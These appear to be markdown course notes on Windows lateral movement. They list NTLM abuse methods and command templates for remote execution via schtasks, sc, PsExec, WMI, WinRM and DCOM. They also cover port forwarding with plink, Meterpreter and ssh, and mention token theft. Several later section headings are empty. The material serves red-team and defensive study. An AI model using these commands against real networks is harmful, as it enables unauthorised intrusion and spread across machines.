# Lateral Movement

## 1. NTLM Authzentication and Abuse
NTLM serves to provide authentication, integrity and confidentiality. Even though dated (using MD4), it is still available in modern windows and is used when: standalone server is not domain joined, kerberos is not supported, ip address is used, DNS fails. In practice it is hardly ever possible to disable NTLM. 
Possible attacks are: 
- pass-the-hash
- NTLM relay (man-in-the-middle)
- break NTLM hash (as not that strong)



## 2. Lateral Movement
Given we have the required credentials, an attacker can move laterally (aka execute malicious code on other machines) by various means: 
- Create a scheduled task (on remote system)`
    - `schtasks /create /s {IP} /tn {name} /u {user} /sc {frequency} /p {password} /st {time} /sd {date} {command}`
- Creating System services
    - `sc \\IP create Service binPath=<command>`
- PsExec
    - `psexec \\test.domain -u Domain\User -p Password ipconfig`
- WMI
    - `wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c payload.exe"`
- Windows Remote Management (WinRM)
    - `winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe`
    - `Invoke-Command -ComputerName TARGET -ScriptBlock { dir c:\ }` via powershell
- DCOM
    - DCOM is a way to execute code on a remote machine. (is less easily detected than default tools)
    - Examples see "06 Lateral Movement.pdf"
        - run a excel on another machine (and excel runs macro)
    - DCOM can also be used to start/stop services, get system info, shut down system etc.

**Double-Hop-Problem** -> with Network logons (like WMI, WinRM)
Network logons don't send credentials to remote system and are therefore not available. So it is not possible to jump to the next machine from there. Therefore, attacker needs to steal a token from a non-network logon session and then inject it in to another process (see pdf)

*Remark: some of the techniques can also be used for persistence*
*Remark: cobalt strike has various means for lateral movement*


**Port forwarding**
To bypass firewalls, prevent inspection,  prevent being detected..
- PuTTY Link (SSH tunneling of a specific port)
    `plink.exe -l root -pw pass123 [target host] -R localhost:3389:127.0.0.1:3389`
- Meterpreter  (forward RDP from localhost to a target host pivoting thru the Meterpreter session)
    - `portfwd add –l 3389 –p 3389 –r [target host]`
- also possible with cobalt strike
- Linux
    - `ssh -L localhost:3389:127.0.0.1:3389 root@[target host]` SSH tunneling of a specific port
    - `ssh -D 9050 root@[target host]` application-level port forwarding acting as SOCKS server


**SOCKS Pivoting**
see pdf (example: How to tunnel the Windows RDP client to your target network?)
can be done with Cobalt Strike or Metasploit

**Password Spraying & Reuse**
see separate file 

## 3. Kerberos Authentication and Abuse

## 4. Persistance


## 5. Red Team War Stories

## 6. Recap


